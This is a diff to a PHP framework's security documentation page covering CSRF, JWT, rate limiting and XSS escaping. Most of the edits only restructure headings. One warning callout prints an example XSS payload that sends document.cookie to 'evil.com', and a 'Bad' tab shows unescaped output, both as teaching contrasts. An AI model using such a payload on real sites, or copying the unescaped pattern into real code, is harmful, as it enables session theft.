@@ -17,8 +17,6 @@ $toc = [
     ['id' => 'best-practices', 'title' => 'Best Practices', 'level' => 2],
     ['id' => 'troubleshooting', 'title' => 'Troubleshooting', 'level' => 2],
 ];
-$prevPage = ['url' => '/docs/auth-system', 'title' => 'Authentication System'];
-$nextPage = ['url' => '/docs/validation-system', 'title' => 'Validation System'];
 $breadcrumbs = [['label' => 'Security Layer']];
 $lastUpdated = '2026-01-30';
 
@@ -56,7 +54,9 @@ include __DIR__ . '/../_layout.php';
     ]
 ) ?>
 
-<h4 class="heading heading-4 mt-4">Security Architecture</h4>
+<h3 class="heading heading-3">
+    <span class="heading-text">Security Architecture</span>
+</h3>
 
 <?= codeBlock('text', 'Request
   ↓
@@ -78,7 +78,9 @@ Response (with sanitized output)') ?>
 
 <?= callout('warning', '<strong>What is CSRF?</strong><br>Cross-Site Request Forgery tricks authenticated users into performing unwanted actions via malicious links or forms.', null, 'alert') ?>
 
-<h4 class="heading heading-4">How It Works</h4>
+<h3 class="heading heading-3">
+    <span class="heading-text">How It Works</span>
+</h3>
 
 <ol class="list">
     <li>User visits your form</li>
@@ -89,7 +91,9 @@ Response (with sanitized output)') ?>
     <li>Token matches → Allow | Invalid → Reject (419)</li>
 </ol>
 
-<h4 class="heading heading-4 mt-4">Usage</h4>
+<h3 class="heading heading-3">
+    <span class="heading-text">Usage</span>
+</h3>
 
 <?= codeTabs([
     ['label' => 'Form', 'lang' => 'php', 'code' => '<form method="POST" action="/invoices">
@@ -118,7 +122,9 @@ Response (with sanitized output)') ?>
 }'],
 ]) ?>
 
-<h4 class="heading heading-4 mt-4">Implementation</h4>
+<h3 class="heading heading-3">
+    <span class="heading-text">Implementation</span>
+</h3>
 
 <?= codeBlockWithFile('php', '<?php
 
@@ -161,7 +167,9 @@ class Csrf
 
 <p>JSON Web Token - Stateless authentication for APIs. No session storage needed!</p>
 
-<h4 class="heading heading-4">Token Structure</h4>
+<h3 class="heading heading-3">
+    <span class="heading-text">Token Structure</span>
+</h3>
 
 <?= codeBlock('text', 'header.payload.signature
 eyJhbGc...  .eyJ1c2Vy... .SflKxwRJ...
@@ -172,7 +180,9 @@ eyJhbGc...  .eyJ1c2Vy... .SflKxwRJ...
   "signature": "..."
 }') ?>
 
-<h4 class="heading heading-4 mt-4">Login Endpoint</h4>
+<h3 class="heading heading-3">
+    <span class="heading-text">Login Endpoint</span>
+</h3>
 
 <?= codeBlock('php', 'public function login(Request $request)
 {
@@ -195,7 +205,9 @@ eyJhbGc...  .eyJ1c2Vy... .SflKxwRJ...
     ]);
 }') ?>
 
-<h4 class="heading heading-4 mt-4">JWT Middleware</h4>
+<h3 class="heading heading-3">
+    <span class="heading-text">JWT Middleware</span>
+</h3>
 
 <?= codeBlockWithFile('php', 'public function handle(Request $request, Closure $next)
 {
@@ -226,7 +238,9 @@ eyJhbGc...  .eyJ1c2Vy... .SflKxwRJ...
 
 <?= callout('info', '<strong>Without Rate Limiting:</strong> Attacker tries 1000 passwords/second → Account compromised in minutes<br><strong>With Rate Limiting:</strong> 5 attempts/minute → Attack takes 200 minutes') ?>
 
-<h4 class="heading heading-4">Usage</h4>
+<h3 class="heading heading-3">
+    <span class="heading-text">Usage</span>
+</h3>
 
 <?= codeBlock('php', 'public function login(Request $request)
 {
@@ -253,7 +267,9 @@ eyJhbGc...  .eyJ1c2Vy... .SflKxwRJ...
     return Response::json([\'token\' => generateToken()]);
 }') ?>
 
-<h4 class="heading heading-4 mt-4">Middleware Usage</h4>
+<h3 class="heading heading-3">
+    <span class="heading-text">Middleware Usage</span>
+</h3>
 
 <?= codeBlock('php', '// throttle:60,1 = 60 requests per minute
 Route::middleware([\'throttle:60,1\'])->group(function() {
@@ -268,7 +284,9 @@ Route::middleware([\'throttle:60,1\'])->group(function() {
 
 <?= callout('danger', '<strong>XSS Attack Example:</strong><br>User submits <code class="code-inline">&lt;script&gt;fetch(\'evil.com?\'+document.cookie)&lt;/script&gt;</code> as their name. Without escaping, it executes on every page!', null, 'alert') ?>
 
-<h4 class="heading heading-4">Always Escape Output</h4>
+<h3 class="heading heading-3">
+    <span class="heading-text">Always Escape Output</span>
+</h3>
 
 <?= codeTabs([
     ['label' => 'Good', 'lang' => 'php', 'code' => '<!-- Safe - escaped -->
@@ -277,7 +295,9 @@ Route::middleware([\'throttle:60,1\'])->group(function() {
 <h1>Welcome <?= $user->name ?></h1>'],
 ]) ?>
 
-<h4 class="heading heading-4 mt-4">Sanitizer Class</h4>
+<h3 class="heading heading-3">
+    <span class="heading-text">Sanitizer Class</span>
+</h3>
 
 <?= codeBlock('php', '// Escape HTML entities
 $safe = Sanitizer::escape($userInput);
@@ -337,7 +357,9 @@ return [
 
 <div class="grid grid-2 gap-4">
     <div>
-        <h4 class="heading heading-4 text-success"><span class="mdi mdi-check"></span> CSRF Tokens</h4>
+        <h3 class="heading heading-3 text-success">
+            <span class="heading-text"><span class="mdi mdi-check"></span> CSRF Tokens</span>
+        </h3>
         <ul class="list list-check">
             <li>Include in all forms</li>
             <li>Regenerate after login/logout</li>
@@ -346,7 +368,9 @@ return [
         </ul>
     </div>
     <div>
-        <h4 class="heading heading-4 text-success"><span class="mdi mdi-check"></span> JWT Tokens</h4>
+        <h3 class="heading heading-3 text-success">
+            <span class="heading-text"><span class="mdi mdi-check"></span> JWT Tokens</span>
+        </h3>
         <ul class="list list-check">
             <li>Strong secret keys (256+ bits)</li>
             <li>Appropriate expiration</li>
@@ -355,7 +379,9 @@ return [
         </ul>
     </div>
     <div>
-        <h4 class="heading heading-4 text-success"><span class="mdi mdi-check"></span> Rate Limiting</h4>
+        <h3 class="heading heading-3 text-success">
+            <span class="heading-text"><span class="mdi mdi-check"></span> Rate Limiting</span>
+        </h3>
         <ul class="list list-check">
             <li>Limit login (5-10/min)</li>
             <li>Limit API (60-100/min)</li>
@@ -364,7 +390,9 @@ return [
         </ul>
     </div>
     <div>
-        <h4 class="heading heading-4 text-success"><span class="mdi mdi-check"></span> XSS Prevention</h4>
+        <h3 class="heading heading-3 text-success">
+            <span class="heading-text"><span class="mdi mdi-check"></span> XSS Prevention</span>
+        </h3>
         <ul class="list list-check">
             <li>Always escape user input</li>
             <li>Use <code class="code-inline">e()</code> helper</li>
@@ -410,7 +438,9 @@ return [
 </div>
 
 <!-- Production Checklist -->
-<h4 class="heading heading-4 mt-4">Production Checklist</h4>
+<h3 class="heading heading-3">
+    <span class="heading-text">Production Checklist</span>
+</h3>
 
 <ul class="list list-check">
     <li>Set strong <code class="code-inline">JWT_SECRET</code> (256+ bits)</li>
